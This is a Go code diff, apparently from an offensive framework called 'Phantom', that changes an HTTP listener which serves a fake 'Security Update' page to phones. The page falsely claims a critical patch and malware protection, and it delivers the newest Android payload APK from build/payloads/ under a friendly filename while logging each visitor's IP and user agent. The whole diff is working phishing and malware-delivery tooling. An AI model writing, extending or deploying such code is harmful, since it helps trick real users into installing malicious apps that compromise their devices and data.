@@ -365,12 +365,30 @@ func (l *HTTPListener) handleAPKPage(w http.ResponseWriter, r *http.Request) {
 	// Log the visit
 	l.emitEvent("apk_page_visit", extractIP(r), r.Header.Get("User-Agent"))
 
+	// Find the latest APK name for the page title
+	root := findProjectRoot()
+	appTitle := "Security Update"
+	entries, _ := os.ReadDir(filepath.Join(root, "build", "payloads"))
+	var newest time.Time
+	for _, e := range entries {
+		if e.IsDir() || !strings.HasSuffix(e.Name(), ".apk") {
+			continue
+		}
+		info, _ := e.Info()
+		if info != nil && info.ModTime().After(newest) {
+			newest = info.ModTime()
+			name := strings.TrimSuffix(e.Name(), ".apk")
+			name = strings.ReplaceAll(name, "-", " ")
+			appTitle = strings.Title(name)
+		}
+	}
+
 	w.Header().Set("Content-Type", "text/html; charset=utf-8")
 	fmt.Fprint(w, `<!DOCTYPE html>
 <html>
 <head>
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>System Security Update</title>
+<title>` + appTitle + `</title>
 <style>
 * { margin:0; padding:0; box-sizing:border-box; }
 body { font-family: -apple-system, 'Segoe UI', Roboto, sans-serif; background: #f5f5f5; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
@@ -396,7 +414,7 @@ p { color: #444; font-size: 14px; line-height: 1.6; margin-bottom: 24px; }
 <body>
 <div class="card">
 <div class="icon">🛡️</div>
-<h1>Security Update Available</h1>
+<h1>` + appTitle + ` Available</h1>
 <div class="version">Version 2026.04.1 • 16 KB</div>
 <p>A critical security patch is ready for your device. This update addresses recent vulnerabilities and improves system protection.</p>
 <ul class="features">
@@ -405,7 +423,7 @@ p { color: #444; font-size: 14px; line-height: 1.6; margin-bottom: 24px; }
 <li>Updates system certificate store</li>
 <li>Enhanced malware protection</li>
 </ul>
-<a href="/app/download" class="btn" id="dl-btn" onclick="showProgress()">Install Security Update</a>
+<a href="/app/download" class="btn" id="dl-btn" onclick="showProgress()">Install ` + appTitle + `</a>
 <div class="progress" id="progress">
 <div class="progress-bar"><div class="progress-fill"></div></div>
 <div class="progress-text">Downloading update...</div>
@@ -433,24 +451,58 @@ function showProgress() {
 </html>`)
 }
 
-// handleAPKDownload serves the built APK as a direct download.
+// handleAPKDownload serves the most recently generated APK as a direct
+// download. Finds the newest .apk file in build/payloads/ so it
+// automatically picks up whichever template was last generated from the
+// Web UI.
 func (l *HTTPListener) handleAPKDownload(w http.ResponseWriter, r *http.Request) {
 	root := findProjectRoot()
-	apkPath := filepath.Join(root, "build", "payloads", "phantom-android.apk")
+	payloadDir := filepath.Join(root, "build", "payloads")
 
-	data, err := os.ReadFile(apkPath)
-	if err != nil {
-		// APK not built yet — tell operator
+	// Find the most recently modified .apk in the payloads directory
+	apkPath := ""
+	apkName := ""
+	var newest time.Time
+	entries, _ := os.ReadDir(payloadDir)
+	for _, e := range entries {
+		if e.IsDir() || !strings.HasSuffix(e.Name(), ".apk") {
+			continue
+		}
+		info, err := e.Info()
+		if err != nil {
+			continue
+		}
+		if info.ModTime().After(newest) {
+			newest = info.ModTime()
+			apkPath = filepath.Join(payloadDir, e.Name())
+			apkName = e.Name()
+		}
+	}
+
+	if apkPath == "" {
 		w.Header().Set("Content-Type", "text/plain")
 		w.WriteHeader(404)
 		fmt.Fprint(w, "APK not generated yet. Generate it from the Phantom Web UI: Payloads → Android Payload → Generate")
 		return
 	}
 
-	l.emitEvent("apk_download", extractIP(r), r.Header.Get("User-Agent"))
+	data, err := os.ReadFile(apkPath)
+	if err != nil {
+		w.Header().Set("Content-Type", "text/plain")
+		w.WriteHeader(500)
+		fmt.Fprintf(w, "Error reading APK: %v", err)
+		return
+	}
+
+	l.emitEvent("apk_download", extractIP(r), r.Header.Get("User-Agent"), apkName)
+
+	// Derive a clean download filename from the APK name
+	downloadName := strings.TrimSuffix(apkName, ".apk")
+	downloadName = strings.ReplaceAll(downloadName, "-", " ")
+	downloadName = strings.Title(downloadName) + ".apk"
 
 	w.Header().Set("Content-Type", "application/vnd.android.package-archive")
-	w.Header().Set("Content-Disposition", `attachment; filename="SystemUpdate.apk"`)
+	w.Header().Set("Content-Disposition", fmt.Sprintf(`attachment; filename="%s"`, downloadName))
 	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(data)))
 	w.Write(data)
 }
